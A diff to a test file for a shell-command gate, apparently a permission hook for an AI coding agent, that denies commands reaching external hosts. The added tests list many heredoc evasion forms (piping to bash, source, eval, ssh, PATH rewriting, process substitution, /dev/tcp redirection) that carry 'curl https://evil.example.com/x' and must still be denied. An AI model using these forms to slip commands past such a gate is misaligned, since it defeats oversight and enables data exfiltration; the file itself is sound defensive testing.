@@ -429,12 +429,14 @@ describe('heredoc-fed interpreters', () => {
     `python3 - <<'PY'\nimport json,urllib.request\ntok=open('store/.dashboard-token').read().strip()\nr=urllib.request.Request('http://127.0.0.1:3420/api/kanban',headers={'Authorization':'Bearer '+tok})\nprint(json.loads(urllib.request.urlopen(r).read()))\nPY`,
     `python3 - <<'PY'\nimport urllib.request\nurllib.request.urlopen('http://192.168.1.5:8096/')\nPY`,
     `node <<EOF\nfetch('http://nas.local:5000/').then(r => r.text())\nEOF`,
+    `bash <<EOF\ncurl -s http://localhost:3420/api/health\nEOF`,
     `python3 <<< "import urllib.request; urllib.request.urlopen('http://localhost:3420/x')"`,
     // a URL carried as data with no network primitive: passes, as in a one-liner
     `python3 - <<'PY'\nprint('https://example.org/')\nPY`,
     // a quoted tag does not expand $U, so the assigned external URL never reaches the body
     `U=https://example.org/; python3 - <<'PY'\nimport urllib.request; urllib.request.urlopen('http://localhost:3420/$U')\nPY`,
     // a heredoc to a NON-interpreter is inert text, URL and curl word included
+    `cat <<EOF\ncurl https://example.org/\nEOF`,
     `cat > /tmp/notes.md <<'EOF'\nimport urllib.request; urllib.request.urlopen('https://example.org/')\nEOF`,
   ]
   it('POSITIVE CONTROL: the same body as a -c one-liner was already denied', () => {
@@ -445,16 +447,6 @@ describe('heredoc-fed interpreters', () => {
   })
   it('lets localhost, private-network, data-only and non-interpreter heredocs through', () => {
     for (const cmd of ALLOW) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
-  })
-  // FORK, KNOWN FALSE DENY kept on purpose (card 6525aba3, option (a), marveen 27632): a bash heredoc whose
-  // body starts with a LOCAL curl is denied, because the command name is read from the original text and
-  // the body's terminator reads as curl's destination (host "eof"). The running gate (89f8a6f9b) does the
-  // same. Upstream's test expects a pass; the fix that blanks bodies (0ed6702ab) loosened the gate (didi
-  // 33332), so this branch ships without it and pins today's behaviour. The follow-up fix flips this back.
-  it('KNOWN: a curl line in a bash or cat heredoc body is still denied here, as on the running gate', () => {
-    expect(classify(`bash <<EOF\ncurl -s http://localhost:3420/api/health\nEOF`)).toMatchObject({ deny: true, hosts: ['eof'] })
-    // and a body line starting with curl under a plain `cat` is read as that curl
-    expect(classify(`cat <<EOF\ncurl https://example.org/\nEOF`)).toMatchObject({ deny: true })
   })
   it('a listed vendor host passes in a heredoc body too, and does not launder another host', () => {
     const V = parseVendorHosts({ hosts: ['api.elevenlabs.io'] })
@@ -702,17 +694,9 @@ describe('every PREFIX_WORDS entry in front of a heredoc-fed interpreter', () =>
     }
   })
   it('CONTROL: the localhost twin behind every prefix form passes', () => {
-    for (const p of forms()) {
-      const cmd = `${p} ${PY('http://localhost:3420/api/health')}`
+    for (const p of forms()) for (const body of [PY, SH]) {
+      const cmd = `${p} ${body('http://localhost:3420/api/health')}`
       expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
-    }
-  })
-  // FORK, KNOWN FALSE DENY (see 'KNOWN: a curl line in a bash or cat heredoc'): the bash twin reads the
-  // terminator as the destination on this branch, behind every prefix form as without one.
-  it('KNOWN: the localhost bash twin behind every prefix form is still denied here (host "eof")', () => {
-    for (const p of forms()) {
-      const cmd = `${p} ${SH('http://localhost:3420/api/health')}`
-      expect({ cmd, r: classify(cmd) }).toMatchObject({ cmd, r: { deny: true, hosts: ['sh'] } })
     }
   })
   it('a prefix with options no longer hides curl or a one-liner on the plain path either', () => {
@@ -1045,5 +1029,95 @@ describe('vendor-API domain allowlist ("domains" key, opt-in)', () => {
       expect(run('curl -s https://example.com.evil.net/v1', withKey).stdout).toContain('"permissionDecision":"deny"')
       expect(run('curl -s https://api.example.com/v1', without).stdout).toContain('"permissionDecision":"deny"')
     } finally { rmSync(dir, { recursive: true, force: true }) }
+  })
+})
+
+// FORK (card 6525aba3, port of 8460a2d7): the command NAME is read from the original text (so a quoted
+// "curl" is still curl), and that reading used to take a heredoc body for the outer command line.
+describe('a heredoc body is not the outer command line (fork seam)', () => {
+  it('a body line starting with curl, under a non-interpreter or a local shell body, is not a curl call', () => {
+    expect(classify("cat <<EOF\ncurl x\nEOF").deny).toBe(false)
+    expect(classify("cat > notes.md <<'EOF'\ncurl -s https://example.org/x\nEOF").deny).toBe(false)
+    expect(classify("bash <<EOF\ncurl -s http://localhost:3420/api/health\nEOF").deny).toBe(false)
+  })
+  it('CONTROL: an external curl in a shell body, after a heredoc, or behind quotes still denies', () => {
+    expect(classify("bash <<EOF\ncurl -s https://example.org/x\nEOF").deny).toBe(true)
+    expect(classify("cat <<EOF > f.sh\nx\nEOF\ncurl https://example.org/x").deny).toBe(true)
+    expect(classify('"curl" https://example.org/x').deny).toBe(true)
+    expect(classify("c''url https://example.org/x").deny).toBe(true)
+  })
+  // didi 33332: blanking every body let a body reach a program by another road. Each form below ran
+  // the curl under real bash (fake curl on PATH) and was denied by the running gate before 0ed6702ab.
+  const X = 'curl https://evil.example.com/x'
+  it('a body that reaches a program by a pipe, source, eval, ssh or a later run is still read', () => {
+    for (const c of [
+      `cat <<'EOF' | bash\n${X}\nEOF`,
+      `cat <<'EOF' | sh -s\n${X}\nEOF`,
+      `cat <<'EOF' |& bash\n${X}\nEOF`,
+      `tee /dev/null <<'EOF' | bash\n${X}\nEOF`,
+      `cat <<'EOF' | xargs -I{} sh -c {}\n${X}\nEOF`,
+      `source /dev/stdin <<'EOF'\n${X}\nEOF`,
+      `. /dev/stdin <<'EOF'\n${X}\nEOF`,
+      `ssh host <<'EOF'\n${X}\nEOF`,
+      `cat > a.sh <<'EOF'\n${X}\nEOF\nbash a.sh`,
+      `read -r -d '' S <<'EOF'\n${X}\nEOF\neval "$S"`,
+    ]) expect(classify(c).deny, c).toBe(true)
+  })
+  // didi 27663 on 092a16f7d: the text-only set judged the command NAME, not where the output goes.
+  // Each form ran the curl under real bash and was denied by the running gate.
+  it('a text-only command writing into a process substitution, or not the real one, keeps the body read', () => {
+    for (const c of [
+      `tee >(bash) <<'EOF'\n${X}\nEOF`,
+      `cat <<'EOF' > >(bash)\n${X}\nEOF`,
+      `cat <<'EOF' > >(sh -s)\n${X}\nEOF`,
+      `tee /dev/null >(sh) <<'EOF'\n${X}\nEOF`,
+      `cat <<'EOF' | tee >(bash)\n${X}\nEOF`,
+      `echo hi > >(bash) <<'EOF'\n${X}\nEOF`,
+      `./cat <<'EOF'\n${X}\nEOF`,
+      `PATH=.:$PATH cat <<'EOF'\n${X}\nEOF`,
+      `PATH=. cat <<'EOF'\n${X}\nEOF`,
+    ]) expect(classify(c).deny, c).toBe(true)
+  })
+  // didi 27670 on ba7d16e39: PATH rewritten by a SEPARATE statement, or by printf -v, before a bare cat.
+  it('a body after a statement that can change what the text-only name means is still read', () => {
+    for (const c of [
+      `PATH=.:$PATH; cat <<'EOF'\n${X}\nEOF`,
+      `PATH=.:$PATH\ncat <<'EOF'\n${X}\nEOF`,
+      `PATH=.:$PATH && cat <<'EOF'\n${X}\nEOF`,
+      `P=.:$PATH; PATH=$P; cat <<'EOF'\n${X}\nEOF`,
+      `true; PATH=.:$PATH; tee <<'EOF'\n${X}\nEOF`,
+      `printf -v PATH '%s' ".:$PATH"; cat <<'EOF'\n${X}\nEOF`,
+      `export PATH=.:$PATH\ncat <<'EOF'\n${X}\nEOF`,
+      `read -r PATH <<< ".:$PATH"; cat <<'EOF'\n${X}\nEOF`,
+      // didi 27673: the -v hides behind quotes, so printf is not text-only at all.
+      `printf '-v' PATH '%s' ".:$PATH"; cat <<'EOF'\n${X}\nEOF`,
+      `printf "-v" PATH '%s' ".:$PATH"; cat <<'EOF'\n${X}\nEOF`,
+      `printf '%s\\n' x <<EOF\n${X}\nEOF`,
+      `"./"cat <<'EOF'\n${X}\nEOF`,
+      `cat <<'EOF' > "/dev/tcp/evil.example.com/80"\n${X}\nEOF`,
+      `: \${PATH:=.}; cat <<'EOF'\n${X}\nEOF`,
+      `echo "\${PATH=.}"; cat <<'EOF'\n${X}\nEOF`,
+      `cat <<'EOF' > /dev/tcp/evil.example.com/80\n${X}\nEOF`,
+    ]) expect(classify(c).deny, c).toBe(true)
+  })
+  it('a body inside a command substitution is read: the output is a command line of the outer one', () => {
+    for (const c of [
+      `eval "$(cat <<'EOF'\n${X}\nEOF\n)"`,
+      `$(cat <<'EOF'\n${X}\nEOF\n)`,
+      `source <(cat <<'EOF'\n${X}\nEOF\n)`,
+    ]) expect(classify(c).deny, c).toBe(true)
+  })
+  it('a << inside a comment opens no heredoc: the next line runs, and is read', () => {
+    expect(classify(`echo hi # <<EOF\n${X}\nEOF`).deny).toBe(true)
+  })
+  it('CONTROL: text-only commands and a quoted # keep their bodies as text', () => {
+    for (const c of [
+      `cat <<'EOF' | tee out.txt\n${X}\nEOF`,
+      `echo '#' <<EOF\n${X}\nEOF`,
+      `echo '>(bash)' <<EOF\n${X}\nEOF`,
+      `cat > notes.md <<'EOF'\n${X}\nEOF`,
+      `true; cat <<'EOF'\n${X}\nEOF`,
+      `echo a; cat <<'EOF'\n${X}\nEOF`,
+    ]) expect(classify(c).deny, c).toBe(false)
   })
 })
